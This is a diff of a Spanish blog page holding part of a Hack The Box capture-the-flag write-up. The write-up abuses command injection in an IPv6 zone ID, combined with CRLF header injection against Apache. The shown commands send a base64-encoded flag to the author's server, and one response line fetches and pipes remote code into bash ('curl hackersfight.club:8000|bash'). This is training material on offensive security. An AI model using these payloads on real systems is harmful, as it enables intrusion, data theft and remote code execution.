-</code></pre><p><strong>Dirección IPv4 inválida:</strong></p>
-<pre tabindex="0"><code>from ipaddress import ip_address
-print(ip_address(&#39;127.0.TEST.1&#39;))
-</code></pre><p><strong>Resultado:</strong></p>
-<pre tabindex="0"><code>ERROR!
-Traceback (most recent call last):
-  File &#34;&lt;main.py&gt;&#34;, line 2, in &lt;module&gt;
-  File &#34;/usr/local/lib/python3.12/ipaddress.py&#34;, line 54, in ip_address
-    raise ValueError(f&#39;{address!r} does not appear to be an IPv4 or IPv6 address&#39;)
-ValueError: &#39;127.0.TEST.1&#39; does not appear to be an IPv4 or IPv6 address
-</code></pre><p>Después de leer la <a href="https://docs.python.org/3/library/ipaddress.html">documentación de la biblioteca ipaddress</a> y el <a href="https://docs.python.org/3/library/ipaddress.html">RFC 4007</a>, aprendí que en IPv6 es posible indicar un identificador de zona, usando la sintaxis <code>&lt;ipv6&gt;%&lt;id_zona&gt;</code>. Lo interesante es la única validación que hace la función <code>ip_address()</code> sobre esta característica: si el caracter &lsquo;%&rsquo; está presente, el ID de zona tambien tiene que incluirse, sin verificar qué tipo de caracteres lo componen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> ipaddress <span style="color:#f92672">import</span> ip_address
+</span></span><span style="display:flex;"><span>print(ip_address(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>))
+</span></span></code></pre></div><p><strong>Resultado:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>127.0.0.1
+</span></span></code></pre></div><p><strong>Dirección IPv4 inválida:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> ipaddress <span style="color:#f92672">import</span> ip_address
+</span></span><span style="display:flex;"><span>print(ip_address(<span style="color:#e6db74">&#39;127.0.TEST.1&#39;</span>))
+</span></span></code></pre></div><p><strong>Resultado:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ERROR!
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;&lt;main.py&gt;&#34;</span>, line 2, in &lt;module&gt;
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/local/lib/python3.12/ipaddress.py&#34;</span>, line 54, in ip_address
+</span></span><span style="display:flex;"><span>    raise ValueError<span style="color:#f92672">(</span>f<span style="color:#e6db74">&#39;{address!r} does not appear to be an IPv4 or IPv6 address&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ValueError: <span style="color:#e6db74">&#39;127.0.TEST.1&#39;</span> does not appear to be an IPv4 or IPv6 address
+</span></span></code></pre></div><p>Después de leer la <a href="https://docs.python.org/3/library/ipaddress.html">documentación de la biblioteca ipaddress</a> y el <a href="https://docs.python.org/3/library/ipaddress.html">RFC 4007</a>, aprendí que en IPv6 es posible indicar un identificador de zona, usando la sintaxis <code>&lt;ipv6&gt;%&lt;id_zona&gt;</code>. Lo interesante es la única validación que hace la función <code>ip_address()</code> sobre esta característica: si el caracter &lsquo;%&rsquo; está presente, el ID de zona tambien tiene que incluirse, sin verificar qué tipo de caracteres lo componen.</p>
 <p>Teniendo esto en mente, probemos nuevamente la función.</p>
 <p><strong>Dirección IPv6 con inyección de comandos en ID de zona</strong></p>
-<pre tabindex="0"><code>from ipaddress import ip_address
-print(ip_address(&#39;::1%$(whoami)&#39;))
-</code></pre><p><strong>Resultado:</strong></p>
-<pre tabindex="0"><code>::1%$(whoami)
-</code></pre><p>La idea detrás del <em>payload</em> final es codificar en base64 la bandera y usar <code>curl</code> para crear una petición HTTP, agregando la bandera codificada como parámetro en la URL y enviándola a un servidor bajo nuestro control.</p>
-<pre tabindex="0"><code>$ curl -i &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bhttps://&lt;--REDACTED--&gt;?flag=`cat%2b/flag*|base64`)%26name=v%0d%0a%0d%0a&#39;
-HTTP/1.1 302 Found
-Date: Wed, 26 Mar 2025 03:42:19 GMT
-Server: Apache/2.4.54 (Debian)
-Location: ../?result=Succesfully attacked ::1%$(curl hackersfight.club:8000|bash)!
-Content-Length: 331
-Content-Type: text/html; charset=iso-8859-1
-
-&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
-&lt;html&gt;&lt;head&gt;
-&lt;title&gt;302 Found&lt;/title&gt;
-&lt;/head&gt;&lt;body&gt;
-&lt;h1&gt;Found&lt;/h1&gt;
-&lt;p&gt;The document has moved &lt;a href=&#34;../?result=Succesfully attacked ::1%$(curl https://&lt;--REDACTED--&gt;?flag=`cat /flag*|base64`)!&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;hr&gt;
-&lt;address&gt;Apache/2.4.54 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;
-&lt;/body&gt;&lt;/html&gt;
-</code></pre><p>Finalmente, recibiendo la petición desde el servidor vulnerable y consiguiendo la bandera.</p>
-<pre tabindex="0"><code>$ grep flag access.log
-83.136.249.227 - - [26/Mar/2025:03:42:19 +0000] &#34;GET /?flag=SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0= HTTP/1.1&#34; 200 4252 &#34;-&#34; &#34;curl/7.74.0&#34;
-
-$ echo &#39;SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0=&#39;|base64 -d
-HTB{h4ndl1n6_m4l4k4r5_f0rc35}
-</code></pre><h2 id="referencias-útiles">Referencias útiles<a href="#referencias-útiles" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> ipaddress <span style="color:#f92672">import</span> ip_address
+</span></span><span style="display:flex;"><span>print(ip_address(<span style="color:#e6db74">&#39;::1%$(whoami)&#39;</span>))
+</span></span></code></pre></div><p><strong>Resultado:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>::1%<span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><p>La idea detrás del <em>payload</em> final es codificar en base64 la bandera y usar <code>curl</code> para crear una petición HTTP, agregando la bandera codificada como parámetro en la URL y enviándola a un servidor bajo nuestro control.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl -i <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bhttps://&lt;--REDACTED--&gt;?flag=`cat%2b/flag*|base64`)%26name=v%0d%0a%0d%0a&#39;</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">26</span> Mar <span style="color:#ae81ff">2025</span> 03:42:19 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Location: ../?result<span style="color:#f92672">=</span>Succesfully attacked ::1%<span style="color:#66d9ef">$(</span>curl hackersfight.club:8000|bash<span style="color:#66d9ef">)</span>!
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">331</span>
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
+</span></span><span style="display:flex;"><span>&lt;title&gt;302 Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>&lt;p&gt;The document has moved &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../?result=Succesfully attacked ::1%</span><span style="color:#66d9ef">$(</span>curl https://&lt;--REDACTED--&gt;?flag<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat /flag*|base64<span style="color:#e6db74">`</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">!&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>&lt;hr&gt;
+</span></span><span style="display:flex;"><span>&lt;address&gt;Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span> Server at 127.0.0.1 Port 80&lt;/address&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><p>Finalmente, recibiendo la petición desde el servidor vulnerable y consiguiendo la bandera.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ grep flag access.log
+</span></span><span style="display:flex;"><span>83.136.249.227 - - <span style="color:#f92672">[</span>26/Mar/2025:03:42:19 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /?flag=SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0= HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">4252</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;curl/7.74.0&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0=&#39;</span>|base64 -d
+</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>h4ndl1n6_m4l4k4r5_f0rc35<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="referencias-útiles">Referencias útiles<a href="#referencias-útiles" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li><a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">Orange Tsai | Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</a></li>
 <li><a href="https://docs.python.org/3/library/ipaddress.html">Python docs | ipaddress — IPv4/IPv6 manipulation library</a></li>
